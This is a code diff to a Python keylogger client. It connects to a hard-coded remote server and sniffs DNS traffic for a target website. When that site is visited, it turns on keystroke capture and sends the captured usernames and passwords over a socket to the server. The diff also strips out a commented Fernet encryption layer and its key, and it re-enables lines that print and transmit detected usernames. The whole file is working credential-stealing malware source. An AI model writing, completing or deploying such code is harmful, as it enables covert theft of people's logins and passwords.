@@ -2,12 +2,7 @@ import socket
 import threading
 import keyboard  # For keylogging 
 from scapy.all import sniff, DNS , DNSQR  # For packet sniffing 
-# from cryptography.fernet import Fernet  # for encrypted communication
 import time
-
-# encrypting our messages.
-# key = b"1vWwNyD6n5f6lk1A8uOeVrv6T71AiAuaENavIsY5x4I="   # key to be entered after every time server in being started
-# cipher = Fernet(key)
 
 # Server details
 SERVER_HOST = "172.22.76.81"
@@ -17,20 +12,6 @@ start_time = time.time()
 duration = 30
 
 keylogger_active = False  # A flag which will command the keylogger that when to get activated
-
-# def keylogger(sock):
-#     """Logs keystrokes and sends them to the server."""
-#     def on_key(event):
-#         global keylogger_active
-#         if keylogger_active:
-#         # Send each keystroke to the server
-#             # sock.sendall(f"KEY: {event.name}\n".encode())
-#             message = f"KEY : {event.name}\n".encode()
-#             encrypted_message = cipher.encrypt(message)
-#             sock.sendall(encrypted_message)
-
-#     keyboard.on_press(on_key)  # Listen for key press events
-#     keyboard.wait()  # Wait indefinitely for key events
 
 def keylogger(sock):
     """Logs keystrokes and sends them to the server."""
@@ -48,9 +29,9 @@ def keylogger(sock):
             message = f"Password: {password} Username={username}".encode()
             sock.sendall(message)
             # else:
-            # print(f"Username detected: {username}")
-            # # Send the username to the server
-            # message = f"Username: {username}\n".encode()
+            print(f"Username detected: {username}")
+            # Send the username to the server
+            message = f"Username: {username}\n".encode()
             sock.sendall(message)
 
             # Reset for the next input
@@ -101,8 +82,6 @@ def packet_sniffer(sock, target_website):
                     keylogger_active = True
                     if (elapsed_time > duration):
                         sock.close()
-                    
-             # Handle unexpected packet formats gracefully
 
     # Start sniffing on all interfaces
     print("Starting packet sniffing...")
@@ -115,14 +94,6 @@ def main():
         client_sock.connect((SERVER_HOST, SERVER_PORT))
         print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
 
-        # Start keylogger and packet sniffer in separate threads
-        # threading.Thread(target=keylogger, args=(client_sock,), daemon=True).start()
-        # threading.Thread(target=packet_sniffer, args=(client_sock, TARGET_WEBSITE), daemon=True).start()
-
-        # # Keep the client running
-        # while True:
-        #     pass
-        # packet_sniffer(client_sock,TARGET_WEBSITE)
         if client_sock:
             sniffer_thread = threading.Thread(target=packet_sniffer,args=(client_sock,TARGET_WEBSITE),daemon=True)
             sniffer_thread.start()
